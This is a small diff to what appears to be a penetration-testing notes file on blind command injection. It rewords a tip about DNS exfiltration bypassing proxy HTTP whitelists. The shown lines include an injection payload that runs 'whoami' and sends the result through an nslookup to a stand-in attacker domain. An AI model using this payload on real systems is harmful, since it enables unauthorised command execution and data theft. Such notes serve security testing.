@@ -24,7 +24,7 @@ Most of command inj are blind, you can try :
 and then see the output going to that file.
 You can try to access directly, or save the file in the images and change a image request and find your file.
 
--Try nslookup to do a whoami to your host
+-Try nslookup:(proxy may have a whitelist for HTTP connection but might allow all DNS query)
 
 This payload will do a nslookup to your domain and display the content of the command whoami:
 & nslookup `whoami`.attacker.com & 
